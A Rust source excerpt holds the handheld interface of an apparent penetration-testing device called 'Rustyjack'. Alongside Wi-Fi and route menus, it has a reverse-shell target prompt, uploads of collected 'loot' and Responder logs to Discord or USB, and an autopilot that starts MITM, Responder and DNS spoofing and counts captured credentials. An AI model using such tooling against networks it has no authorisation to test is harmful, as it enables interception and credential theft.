    fn show_wifi_status_view(&mut self) -> Result<()> {
        let status = self.fetch_wifi_status()?;
        let snapshot = self.fetch_route_snapshot()?;
        
        // Determine if this interface is the active default route
        let is_active = snapshot.default_route
            .as_ref()
            .and_then(|r| r.interface.as_ref())
            .map(|iface| iface == &status.interface)
            .unwrap_or(false);
        
        let active_indicator = if is_active { " [ACTIVE]" } else { "" };
        
        let mut lines = vec![
            format!("Iface: {}{}", status.interface, active_indicator),
            format!(
                "IP: {}",
                status.address.unwrap_or_else(|| "n/a".to_string())
            ),
        ];
        
        if let Some(ssid) = status.ssid {
            let conn_status = if status.connected.unwrap_or(false) {
                "connected"
            } else {
                "not connected"
            };
            lines.push(format!("SSID: {} ({})", ssid, conn_status));
        }
        
        if let Some(gateway) = status.gateway {
            lines.push(format!("GW: {gateway}"));
        }
        
        if let Some(route) = snapshot.default_route {
            if let Some(iface) = route.interface {
                lines.push(format!("Default via: {iface}"));
            }
            if let Some(gw) = route.gateway {
                lines.push(format!("Route GW: {gw}"));
            }
        }
        
        if !snapshot.dns_servers.is_empty() {
            lines.push("DNS:".to_string());
            for dns in snapshot.dns_servers.iter().take(2) {
                lines.push(format!("  {dns}"));
            }
        }
        
        self.show_message("Wi-Fi info", lines.iter().map(|s| s.as_str()))
    }

    fn show_wifi_route_menu(&mut self) -> Result<()> {
        use WifiRouteChoice::*;
        let actions = vec![
            ("Show snapshot", Snapshot),
            ("Force Wi-Fi default", ForceWifi),
            ("Force Ethernet default", ForceEthernet),
            ("Backup routes", Backup),
            ("Restore routes", Restore),
            ("Exit route control", Exit),
        ];

        loop {
            let labels: Vec<String> = actions
                .iter()
                .map(|(label, _)| format!(" {label}"))
                .collect();
            let Some(index) = self.choose_from_list("Route control", &labels)? else {
                break;
            };
            match actions[index].1 {
                Snapshot => {
                    self.show_route_snapshot()?;
                }
                ForceWifi => {
                    self.switch_to_wifi()?;
                }
                ForceEthernet => {
                    self.switch_to_ethernet()?;
                }
                Backup => self.backup_routes()?,
                Restore => self.restore_routes()?,
                Exit => break,
            }
        }
        Ok(())
    }

    fn restart_system(&mut self) -> Result<()> {
        Command::new("reboot")
            .status()
            .ok();
        Ok(())
    }

    fn choose_from_list(&mut self, title: &str, items: &[String]) -> Result<Option<usize>> {
        if items.is_empty() {
            return Ok(None);
        }
        let mut index = 0usize;
        loop {
            let overlay = self.stats.snapshot();
            let content = vec![title.to_string(), items[index].clone()];
            self.display.draw_dialog(&content, &overlay)?;
            let button = self.buttons.wait_for_press()?;
            match self.map_button(button) {
                ButtonAction::Up => {
                    if index == 0 {
                        index = items.len() - 1;
                    } else {
                        index -= 1;
                    }
                }
                ButtonAction::Down => index = (index + 1) % items.len(),
                ButtonAction::Select => return Ok(Some(index)),
                ButtonAction::Back => return Ok(None),
                ButtonAction::MainMenu => {
                    self.menu_state.home();
                    return Ok(None);
                }
                ButtonAction::Reboot => {
                    self.confirm_reboot()?;
                }
                _ => {}
            }
        }
    }

    fn prompt_octet(&mut self, prefix: &str) -> Result<Option<u8>> {
        let mut value: i32 = 1;
        loop {
            let overlay = self.stats.snapshot();
            let content = vec![
                "Reverse shell target".to_string(),
                format!("{prefix}.{}", value.clamp(0, 255)),
                "UP/DOWN to adjust".to_string(),
                "OK to confirm".to_string(),
            ];
            self.display.draw_dialog(&content, &overlay)?;
            let button = self.buttons.wait_for_press()?;
            match self.map_button(button) {
                ButtonAction::Up => value = (value + 1).min(255),
                ButtonAction::Down => value = (value - 1).max(0),
                ButtonAction::Select => return Ok(Some(value as u8)),
                ButtonAction::Back => return Ok(None),
                ButtonAction::MainMenu => {
                    self.menu_state.home();
                    return Ok(None);
                }
                ButtonAction::Reboot => {
                    self.confirm_reboot()?;
                }
                _ => {}
            }
        }
    }

    fn handle_network_selection(&mut self, network: &WifiNetworkEntry) -> Result<()> {
        let Some(ssid) = network
            .ssid
            .as_deref()
            .filter(|s| !s.is_empty())
            .map(|s| s.to_string())
        else {
            self.show_message("Wi-Fi", ["Hidden SSID - configure via CLI"])?;
            return Ok(());
        };
        let mut details = vec![format!("SSID: {ssid}")];
        if let Some(signal) = network.signal_dbm {
            details.push(format!("Signal: {signal} dBm"));
        }
        if let Some(channel) = network.channel {
            details.push(format!("Channel: {channel}"));
        }
        if let Some(bssid) = network.bssid.as_deref() {
            details.push(format!("BSSID: {bssid}"));
        }
        details.push(if network.encrypted {
            "Encrypted: yes".to_string()
        } else {
            "Encrypted: no".to_string()
        });
        self.show_message("Network", details.iter().map(|s| s.as_str()))?;

        let actions = vec!["Connect".to_string(), "Back".to_string()];
        if let Some(choice) = self.choose_from_list("Network action", &actions)? {
            if choice == 0 {
                if self.connect_profile_by_ssid(&ssid)? {
                    // message handled in helper
                } else {
                    let msg = vec![format!("No saved profile for {ssid}")];
                    self.show_message("Wi-Fi", msg.iter().map(|s| s.as_str()))?;
                }
            }
        }
        Ok(())
    }

    fn handle_profile_selection(&mut self, profile: &WifiProfileSummary) -> Result<()> {
        let actions = vec![
            "Connect".to_string(),
            "Delete".to_string(),
            "Back".to_string(),
        ];
        if let Some(choice) =
            self.choose_from_list(&format!("Profile {}", profile.ssid), &actions)?
        {
            match choice {
                0 => self.connect_named_profile(&profile.ssid)?,
                1 => self.delete_profile(&profile.ssid)?,
                _ => {}
            }
        }
        Ok(())
    }

    fn fetch_wifi_scan(&mut self) -> Result<WifiScanResponse> {
        let args = WifiScanArgs { interface: None };
        let (_, data) = self
            .core
            .dispatch(Commands::Wifi(WifiCommand::Scan(args)))?;
        let resp: WifiScanResponse = serde_json::from_value(data)?;
        Ok(resp)
    }

    fn fetch_wifi_profiles(&mut self) -> Result<Vec<WifiProfileSummary>> {
        let (_, data) = self.core.dispatch(Commands::Wifi(WifiCommand::Profile(
            WifiProfileCommand::List,
        )))?;
        let resp: WifiProfilesResponse = serde_json::from_value(data)?;
        Ok(resp.profiles)
    }

    fn fetch_wifi_interfaces(&mut self) -> Result<Vec<InterfaceSummary>> {
        let (_, data) = self.core.dispatch(Commands::Wifi(WifiCommand::List))?;
        let resp: WifiListResponse = serde_json::from_value(data)?;
        Ok(resp.interfaces)
    }

    fn fetch_route_snapshot(&mut self) -> Result<RouteSnapshot> {
        let (_, data) = self
            .core
            .dispatch(Commands::Wifi(WifiCommand::Route(WifiRouteCommand::Status)))?;
        let resp: RouteSnapshot = serde_json::from_value(data)?;
        Ok(resp)
    }

    fn fetch_wifi_status(&mut self) -> Result<WifiStatusOverview> {
        let args = WifiStatusArgs { interface: None };
        let (_, data) = self
            .core
            .dispatch(Commands::Wifi(WifiCommand::Status(args)))?;
        let status: WifiStatusOverview = serde_json::from_value(data)?;
        Ok(status)
    }

    fn connect_profile_by_ssid(&mut self, ssid: &str) -> Result<bool> {
        let profiles = self.fetch_wifi_profiles()?;
        if !profiles.iter().any(|profile| profile.ssid == ssid) {
            return Ok(false);
        }
        self.connect_named_profile(ssid)?;
        Ok(true)
    }

    fn connect_named_profile(&mut self, ssid: &str) -> Result<()> {
        self.show_progress("Wi-Fi", ["Connecting...", ssid, "Please wait"])?;
        
        let args = WifiProfileConnectArgs {
            profile: Some(ssid.to_string()),
            ssid: None,
            password: None,
            interface: None,
            remember: false,
        };
        
        match self.core.dispatch(Commands::Wifi(WifiCommand::Profile(
            WifiProfileCommand::Connect(args),
        ))) {
            Ok(_) => {
                let msg = vec![format!("Connected to {ssid}")];
                self.show_message("Wi-Fi", msg.iter().map(|s| s.as_str()))?;
            }
            Err(err) => {
                let msg = vec![format!("Connection failed:"), format!("{err}")];
                self.show_message("Wi-Fi error", msg.iter().map(|s| s.as_str()))?;
            }
        }
        Ok(())
    }

    fn delete_profile(&mut self, ssid: &str) -> Result<()> {
        let args = WifiProfileDeleteArgs {
            ssid: ssid.to_string(),
        };
        match self.core.dispatch(Commands::Wifi(WifiCommand::Profile(
            WifiProfileCommand::Delete(args),
        ))) {
            Ok(_) => {
                let msg = vec![format!("Deleted {ssid}")];
                self.show_message("Wi-Fi", msg.iter().map(|s| s.as_str()))?;
            }
            Err(err) => {
                let msg = vec![format!("{err}")];
                self.show_message("Wi-Fi error", msg.iter().map(|s| s.as_str()))?;
            }
        }
        Ok(())
    }

    fn show_route_snapshot(&mut self) -> Result<()> {
        let snapshot = self.fetch_route_snapshot()?;
        let mut lines = Vec::new();
        if let Some(route) = snapshot.default_route.clone() {
            if let Some(iface) = route.interface {
                lines.push(format!("Default: {iface}"));
            }
            if let Some(gateway) = route.gateway {
                lines.push(format!("Gateway: {gateway}"));
            }
        }
        for iface in snapshot.interfaces.iter().take(4) {
            let ip = iface.ip.as_deref().unwrap_or("no ip");
            lines.push(format!("{} ({}) {ip}", iface.name, iface.oper_state));
        }
        if !snapshot.dns_servers.is_empty() {
            lines.push("DNS:".to_string());
            for dns in snapshot.dns_servers.iter().take(3) {
                lines.push(format!("  {dns}"));
            }
        }
        if lines.is_empty() {
            lines.push("No routing data".to_string());
        }
        self.show_message("Routing", lines.iter().map(|s| s.as_str()))
    }

    fn backup_routes(&mut self) -> Result<()> {
        match self
            .core
            .dispatch(Commands::Wifi(WifiCommand::Route(WifiRouteCommand::Backup)))
        {
            Ok((_, data)) => {
                let path = data.get("path").and_then(Value::as_str).unwrap_or("saved");
                let msg = vec![format!("Backup at {path}")];
                self.show_message("Routing", msg.iter().map(|s| s.as_str()))?;
            }
            Err(err) => {
                let msg = vec![format!("{err}")];
                self.show_message("Route error", msg.iter().map(|s| s.as_str()))?;
            }
        }
        Ok(())
    }

    fn restore_routes(&mut self) -> Result<()> {
        match self.core.dispatch(Commands::Wifi(WifiCommand::Route(
            WifiRouteCommand::Restore,
        ))) {
            Ok(_) => {
                self.show_message("Routing", ["Restored last backup"])?;
            }
            Err(err) => {
                let msg = vec![format!("{err}")];
                self.show_message("Route error", msg.iter().map(|s| s.as_str()))?;
            }
        }
        Ok(())
    }

    fn start_bridge(&mut self) -> Result<()> {
        let interfaces = self.fetch_wifi_interfaces()?;
        if interfaces.len() < 2 {
            self.show_message("Bridge", ["Need two interfaces"])?;
            return Ok(());
        }
        let names: Vec<String> = interfaces.iter().map(|iface| iface.name.clone()).collect();
        let Some(a) = self.choose_interface_name("Select bridge interface A", &names)? else {
            return Ok(());
        };
        let Some(b) = self.choose_interface_name("Select bridge interface B", &names)? else {
            return Ok(());
        };
        if a == b {
            self.show_message("Bridge", ["Interfaces must differ"])?;
            return Ok(());
        }
        let args = BridgeStartArgs {
            interface_a: a.clone(),
            interface_b: b.clone(),
        };
        match self
            .core
            .dispatch(Commands::Bridge(BridgeCommand::Start(args)))
        {
            Ok((_, data)) => {
                self.bridge_pair = Some((a.clone(), b.clone()));
                let capture = data
                    .get("capture_path")
                    .and_then(Value::as_str)
                    .unwrap_or("");
                let mut lines = vec![format!("Bridge {a}↔{b} active")];
                if !capture.is_empty() {
                    lines.push(format!(
                        "pcap: {}",
                        Path::new(capture)
                            .file_name()
                            .and_then(|n| n.to_str())
                            .unwrap_or(capture)
                    ));
                }
                self.show_message("Bridge", lines.iter().map(|s| s.as_str()))?;
            }
            Err(err) => {
                let msg = err.to_string();
                self.show_message("Bridge error", [msg.as_str()])?;
            }
        }
        Ok(())
    }

    fn stop_bridge(&mut self) -> Result<()> {
        let (a, b) = self
            .bridge_pair
            .clone()
            .unwrap_or_else(|| ("eth0".to_string(), "eth1".to_string()));
        let args = BridgeStopArgs {
            interface_a: a.clone(),
            interface_b: b.clone(),
        };
        match self
            .core
            .dispatch(Commands::Bridge(BridgeCommand::Stop(args)))
        {
            Ok(_) => {
                self.show_message("Bridge", ["Bridge stopped"])?;
                self.bridge_pair = None;
            }
            Err(err) => {
                let msg = err.to_string();
                self.show_message("Bridge error", [msg.as_str()])?;
            }
        }
        Ok(())
    }

    fn discord_upload(&mut self) -> Result<()> {
        let (temp_path, archive_path) = self.build_loot_archive()?;
        let args = DiscordSendArgs {
            title: "Rustyjack Loot".to_string(),
            message: Some("Complete loot archive".to_string()),
            file: Some(archive_path.clone()),
            target: None,
            interface: None,
        };
        let result = self.core.dispatch(Commands::Notify(NotifyCommand::Discord(
            DiscordCommand::Send(args),
        )));
        drop(temp_path);
        match result {
            Ok(_) => self.show_message("Discord", ["Loot uploaded"])?,
            Err(err) => {
                let msg = err.to_string();
                self.show_message("Discord", [msg.as_str()])?;
            }
        }
        Ok(())
    }

    fn transfer_to_usb(&mut self) -> Result<()> {
        // Find USB mount point
        let usb_path = match self.find_usb_mount() {
            Ok(path) => path,
            Err(_e) => {
                self.show_message("USB Transfer Error", [
                    "No USB drive detected",
                    "Please insert a USB drive",
                    "and try again"
                ])?;
                return Ok(());
            }
        };
        
        let loot_dir = self.root.join("loot");
        let responder_logs = self.root.join("Responder").join("logs");
        
        if !loot_dir.exists() && !responder_logs.exists() {
            self.show_message("USB Transfer", ["No loot to transfer"])?;
            return Ok(());
        }

        // Collect all files to transfer
        let mut files = Vec::new();
        if loot_dir.exists() {
            for entry in WalkDir::new(&loot_dir) {
                let entry = entry?;
                if entry.file_type().is_file() {
                    files.push(entry.path().to_path_buf());
                }
            }
        }
        if responder_logs.exists() {
            for entry in WalkDir::new(&responder_logs) {
                let entry = entry?;
                if entry.file_type().is_file() {
                    files.push(entry.path().to_path_buf());
                }
            }
        }

        if files.is_empty() {
            self.show_message("USB Transfer", ["No files to transfer"])?;
            return Ok(());
        }

        let total_files = files.len();
        let status = self.stats.snapshot();

        // Transfer files with progress
        for (idx, file_path) in files.iter().enumerate() {
            let progress = ((idx + 1) as f32 / total_files as f32) * 100.0;
            
            let filename = file_path.file_name()
                .and_then(|n| n.to_str())
                .unwrap_or("file");
            
            self.display.draw_progress_dialog(
                "USB Transfer",
                filename,
                progress,
                &status
            )?;

            // Determine destination path
            let dest = if file_path.starts_with(&loot_dir) {
                let rel = file_path.strip_prefix(&loot_dir).unwrap_or(file_path);
                usb_path.join("Rustyjack_Loot").join("loot").join(rel)
            } else if file_path.starts_with(&responder_logs) {
                let rel = file_path.strip_prefix(&responder_logs).unwrap_or(file_path);
                usb_path.join("Rustyjack_Loot").join("ResponderLogs").join(rel)
            } else {
                continue;
            };

            // Create destination directory
            if let Some(parent) = dest.parent() {
                fs::create_dir_all(parent)?;
            }

            // Copy file
            fs::copy(file_path, &dest)?;
        }

        self.show_message("USB Transfer", [
            &format!("Transferred {} files", total_files),
            "to USB drive"
        ])?;
        
        Ok(())
    }

    fn find_usb_mount(&self) -> Result<PathBuf> {
        // Check common mount points
        let mount_points = [
            "/media",
            "/mnt",
            "/run/media",
        ];

        for base in &mount_points {
            let base_path = Path::new(base);
            if !base_path.exists() {
                continue;
            }

            // Iterate through subdirectories
            if let Ok(entries) = fs::read_dir(base_path) {
                for entry in entries.flatten() {
                    let path = entry.path();
                    if path.is_dir() {
                        // Check if it looks like a USB mount (has write permission)
                        if self.is_writable_mount(&path) {
                            return Ok(path);
                        }
                    }
                }
            }
        }

        bail!("No USB drive found. Please insert a USB drive.")
    }

    fn is_writable_mount(&self, path: &Path) -> bool {
        // Try to create a test file to verify write access
        let test_file = path.join(".rustyjack_test");
        if fs::write(&test_file, b"test").is_ok() {
            let _ = fs::remove_file(&test_file);
            true
        } else {
            false
        }
    }

    fn run_system_update(&mut self) -> Result<()> {
        let args = SystemUpdateArgs {
            service: "rustyjack".to_string(),
            remote: "origin".to_string(),
            branch: "main".to_string(),
            backup_dir: None,
        };

        let core = self.core.clone();
        let display = &mut self.display;
        let stats = &self.stats;

        let result = core.run_system_update_with_progress(args, |pct, task| {
            let status = stats.snapshot();
            let _ = display.draw_progress_dialog("System Update", task, pct, &status);
        });

        match result {
            Ok((_, data)) => {
                let backup = data
                    .get("backup_path")
                    .and_then(Value::as_str)
                    .unwrap_or("archive");
                let msg = vec!["Updated from git".to_string(), format!("Backup: {backup}")];
                self.show_message("Update", msg.iter().map(|s| s.as_str()))?;
            }
            Err(err) => {
                let msg = err.to_string();
                self.show_message("Update", [msg.as_str()])?;
            }
        }
        Ok(())
    }

    fn build_loot_archive(&self) -> Result<(TempPath, PathBuf)> {
        let mut temp = NamedTempFile::new()?;
        {
            let mut zip = ZipWriter::new(&mut temp);
            let options = FileOptions::default().compression_method(CompressionMethod::Deflated);
            self.add_directory_to_zip(&mut zip, &self.root.join("loot"), "loot/", options.clone())?;
            self.add_directory_to_zip(
                &mut zip,
                &self.root.join("Responder").join("logs"),
                "ResponderLogs/",
                options,
            )?;
            zip.finish()?;
        }
        let temp_path = temp.into_temp_path();
        let path = temp_path.to_path_buf();
        Ok((temp_path, path))
    }

    fn add_directory_to_zip(
        &self,
        zip: &mut ZipWriter<&mut NamedTempFile>,
        dir: &Path,
        prefix: &str,
        options: FileOptions,
    ) -> Result<()> {
        if !dir.exists() {
            return Ok(());
        }
        for entry in WalkDir::new(dir) {
            let entry = entry?;
            if entry.file_type().is_file() {
                let rel = entry.path().strip_prefix(dir).unwrap_or(entry.path());
                let mut name = PathBuf::from(prefix);
                name.push(rel);
                let name = name.to_string_lossy().replace('\\', "/");
                zip.start_file(name, options)?;
                let data = fs::read(entry.path())?;
                zip.write_all(&data)?;
            }
        }
        Ok(())
    }

    fn choose_interface_name(&mut self, title: &str, names: &[String]) -> Result<Option<String>> {
        if names.is_empty() {
            self.show_message("Interfaces", ["No interfaces detected"])?;
            return Ok(None);
        }
        let labels: Vec<String> = names.iter().map(|n| format!(" {n}")).collect();
        Ok(self
            .choose_from_list(title, &labels)?
            .map(|idx| names[idx].clone()))
    }

    fn autopilot_start(&mut self, mode: AutopilotMode) -> Result<()> {
        let core_mode = match mode {
            AutopilotMode::Standard => CoreAutopilotMode::Standard,
            AutopilotMode::Aggressive => CoreAutopilotMode::Aggressive,
            AutopilotMode::Stealth => CoreAutopilotMode::Stealth,
            AutopilotMode::Harvest => CoreAutopilotMode::Harvest,
        };

        let args = AutopilotStartArgs {
            mode: core_mode,
            interface: None,
            scan: true,
            mitm: true,
            responder: true,
            dns_spoof: Some(self.spoof_site.clone()),
            duration: 0,
            check_interval: 30,
        };

        match self.core.dispatch(Commands::Autopilot(AutopilotCommand::Start(args))) {
            Ok((_, data)) => {
                let mode_str = data.get("mode").and_then(|v| v.as_str()).unwrap_or("unknown");
                let msg = vec![
                    "Autopilot started".to_string(),
                    format!("Mode: {}", mode_str),
                    "Running...".to_string(),
                ];
                self.show_message("Autopilot", msg.iter().map(|s| s.as_str()))?;
            }
            Err(err) => {
                let msg = vec![format!("{}", err)];
                self.show_message("Autopilot error", msg.iter().map(|s| s.as_str()))?;
            }
        }
        Ok(())
    }

    fn autopilot_stop(&mut self) -> Result<()> {
        match self.core.dispatch(Commands::Autopilot(AutopilotCommand::Stop)) {
            Ok(_) => {
                self.show_message("Autopilot", ["Stopped"])?;
            }
            Err(err) => {
                let msg = vec![format!("{}", err)];
                self.show_message("Autopilot error", msg.iter().map(|s| s.as_str()))?;
            }
        }
        Ok(())
    }

    fn autopilot_status(&mut self) -> Result<()> {
        match self.core.dispatch(Commands::Autopilot(AutopilotCommand::Status)) {
            Ok((_, data)) => {
                let running = data.get("running").and_then(|v| v.as_bool()).unwrap_or(false);
                let phase = data.get("phase").and_then(|v| v.as_str()).unwrap_or("unknown");
                let elapsed = data.get("elapsed_secs").and_then(|v| v.as_u64()).unwrap_or(0);
                let creds = data.get("credentials_captured").and_then(|v| v.as_u64()).unwrap_or(0);
                let packets = data.get("packets_captured").and_then(|v| v.as_u64()).unwrap_or(0);

                let status_text = if running { "RUNNING" } else { "STOPPED" };
                let elapsed_mins = elapsed / 60;
                let elapsed_secs = elapsed % 60;

                let msg = vec![
                    format!("Status: {}", status_text),
                    format!("Phase: {}", phase),
                    format!("Time: {}m{}s", elapsed_mins, elapsed_secs),
                    format!("Creds: {}", creds),
                    format!("Pkts: {}", packets),
                ];
                self.show_message("Autopilot Status", msg.iter().map(|s| s.as_str()))?;
            }
            Err(err) => {
                let msg = vec![format!("{}", err)];
                self.show_message("Autopilot error", msg.iter().map(|s| s.as_str()))?;
            }
        }
        Ok(())
    }

    fn toggle_discord(&mut self) -> Result<()> {
        self.config.settings.discord_enabled = !self.config.settings.discord_enabled;
        self.save_config()?;
        // No message needed as the menu label will update immediately
        Ok(())
    }
    
    fn show_hardware_detect(&mut self) -> Result<()> {
        self.show_progress("Hardware Scan", ["Detecting interfaces...", "Please wait"])?;
        
        match self.core.dispatch(Commands::Hardware(HardwareCommand::Detect)) {
            Ok((_, data)) => {
                let eth_count = data.get("ethernet_count").and_then(|v| v.as_u64()).unwrap_or(0);
                let wifi_count = data.get("wifi_count").and_then(|v| v.as_u64()).unwrap_or(0);
                let other_count = data.get("other_count").and_then(|v| v.as_u64()).unwrap_or(0);
                
                let ethernet_ports = data.get("ethernet_ports").and_then(|v| v.as_array()).cloned().unwrap_or_default();
                let wifi_modules = data.get("wifi_modules").and_then(|v| v.as_array()).cloned().unwrap_or_default();
                
                // Build detailed view
                let mut lines = vec![
                    format!("Ethernet: {}", eth_count),
                    format!("WiFi: {}", wifi_count),
                    format!("Other: {}", other_count),
                    "".to_string(),
                ];
                
                if !ethernet_ports.is_empty() {
                    lines.push("Ethernet Ports:".to_string());
                    for port in &ethernet_ports {
                        if let Some(name) = port.get("name").and_then(|v| v.as_str()) {
                            let status = port.get("oper_state").and_then(|v| v.as_str()).unwrap_or("?");
                            let ip = port.get("ip").and_then(|v| v.as_str()).unwrap_or("no ip");
                            lines.push(format!("  {}: {} {}", name, status, ip));
                        }
                    }
                    lines.push("".to_string());
                }
                
                if !wifi_modules.is_empty() {
                    lines.push("WiFi Modules:".to_string());
                    for module in &wifi_modules {
                        if let Some(name) = module.get("name").and_then(|v| v.as_str()) {
                            let status = module.get("oper_state").and_then(|v| v.as_str()).unwrap_or("?");
                            let ip = module.get("ip").and_then(|v| v.as_str()).unwrap_or("no ip");
                            lines.push(format!("  {}: {} {}", name, status, ip));
                        }
                    }
                }
                
                self.show_message("Hardware Detected", lines.iter().map(|s| s.as_str()))?;
            }
            Err(err) => {
                let msg = vec![format!("Scan failed: {}", err)];
                self.show_message("Hardware Error", msg.iter().map(|s| s.as_str()))?;
            }
        }
        Ok(())
    }
}

